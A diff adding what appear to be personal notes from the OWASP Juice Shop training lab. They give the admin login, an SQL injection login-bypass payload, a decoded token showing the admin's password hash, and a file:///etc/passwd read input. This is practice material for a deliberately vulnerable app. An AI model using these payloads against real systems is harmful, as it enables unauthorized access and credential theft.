@@ -1,0 +1,44 @@
+admin@juice-sh.op
+password = admin123
+
+For Enter With SQL:
+SQL Injection = admin@juice-sh.op' OR 1=1--
+So you can write password what you want...
+********************
+
+{
+  "status": "success",
+  "data": {
+    "id": 1,
+    "username": "",
+    "email": "admin@juice-sh.op",
+    "password": "0192023a7bbd73250516f069df18b500",
+    "role": "admin",
+    "deluxeToken": "",
+    "lastLoginIp": "undefined",
+    "profileImage": "assets/public/images/uploads/default.svg",
+    "totpSecret": "",
+    "isActive": true,
+    "createdAt": "2020-10-19 13:00:04.308 +00:00",
+    "updatedAt": "2020-10-19 13:59:01.826 +00:00",
+    "deletedAt": null
+  },
+  "iat": 1603116006,
+  "exp": 1603134006
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+file:///etc/passwd
